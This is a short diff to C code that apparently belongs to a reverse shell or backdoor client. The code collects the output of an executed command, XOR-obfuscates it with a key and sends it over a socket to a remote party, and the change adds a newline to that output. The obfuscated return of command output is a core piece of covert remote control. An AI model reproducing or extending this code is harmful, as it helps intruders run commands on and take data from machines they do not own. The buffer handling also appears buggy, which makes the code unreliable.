@@ -88,13 +88,14 @@ int main(void) {
 
 				char path[2050];
 				char command[12000];
+				char* reset = "\n";
 				while (fgets(path, sizeof(path), fp) != NULL) {
 					strncat(command, path, strlen(path));
 				}
-				char* xordata = XOR(command, key, strlen(command), keylen);
-				
-				send(sock, xordata, strlen(command), 0);
 
+				strncat(command, reset, strlen(reset));
+				char* xordata = XOR(command, key, strlen(command), keylen);
+				send(sock, xordata, strlen(command), 0);
 				//free(xornewline);
 				free(xordata);
 				memset(command, '\0', strlen(command));
